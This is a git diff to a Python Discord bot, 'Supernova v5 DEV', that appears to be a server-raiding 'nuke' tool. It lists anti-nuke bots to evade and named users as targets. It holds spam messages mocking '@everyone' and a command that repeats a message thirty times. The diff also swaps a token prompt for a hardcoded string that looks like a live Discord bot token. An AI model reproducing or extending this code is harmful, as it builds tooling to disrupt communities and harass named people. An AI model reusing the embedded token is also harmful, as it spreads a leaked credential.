@@ -22,9 +22,9 @@ print("Defining varibles...")
 intents = discord.Intents().all()
 ver = "Supernova v5 DEV"
 bot = commands.Bot(command_prefix=">")
-token = sd.askstring(ver, "Enter token:")
+#token = sd.askstring(ver, "Enter token:")
 #BELOW VARIBLE IS FOR DEV ONLY!! UNCOMMENT IF YOU ARE MODIFIYING THIS CODE!
-token = "Token here"
+token = "OTc3NTM1MDgxMzUyNjU4OTc0.G1x87D.MV7K-T6W5A4UVHJvR0Uf56WQ_-pGjeHvnoYycA"
 ANTI_NUKES = ["Protection X#1252", "Security#1120", "Wick#3938"]
 TARGETS = ["Snipe#1460", "Frauder#0724", "KingofShadows#4639", "sachiko#6354"]
 TRUSTED = ["Nothecker#8491", "The_SysKill#1878", "Dragoblade#3001"]
@@ -37,22 +37,7 @@ SPAM_MESSAGE = ["""```ansi
             [2;45m  [0m      [2;45m  [0m    [2;45m  [0m[2;45m [0m         [2;31m|[0m    [2;35m                 555[0m
    [2;45m          [0m       [2;45m  [0m     [2;45m  [0m         [2;31m|[0m[2;35m                5555555[0m
 [2;40m[0m
-```""","@everyone You Got Blown up with %s" % ver, "CODE Written By Sys, @everyone MUST SUFFER, \n","@everyone MUST LEARN CODING OR ELSE", "Frauder is a fraud, idk why i put this here, probably coz its true.","""L
-L
-L
-L
-L
-L
-L
-L
-L
-L
-
-L
-L
-L
-L
-LLLLLLLLLLLLLLLLLLL U GOT DUNKED ON @everyone"""]
+```""","@everyone You Got Blown up with %s" % ver, "CODE Written By Sys, @everyone MUST SUFFER, \n","@everyone MUST LEARN CODING OR ELSE", "Frauder is a fraud, idk why i put this here, probably coz its true.","GG U GOT NUKED"]
 SYS_IS_GOD = """```ansi
 [2;45m[2;33m[2;40mSYSKILL IS GOD! SYSKILL IS GOD! SYSKILL IS GOD! SYSKILL IS GOD!
                     [2;41m         [0m[2;33m[2;40m    [2;41m  [0m[2;33m[2;40m   [2;41m  [0m[2;33m[2;40m    [2;41m          [0m[2;33m[2;40m         
@@ -383,7 +368,7 @@ async def fun(ctx, *,spamstuff=None):
         response = discord.Embed(title="Error", description="Wopps, you didnt specify what fun you want!", color=0xff0033)
         await ctx.send(embed=response)
     else:
-        await ctx.send(spamstuff*30)
+        await ctx.send(" "+spamstuff*30)
 
 @client.command(help="Banner Hammer")
 async def ban(ctx, member : discord.Member, *, reason = "Outta here nerd, Banned by %s" % ver):
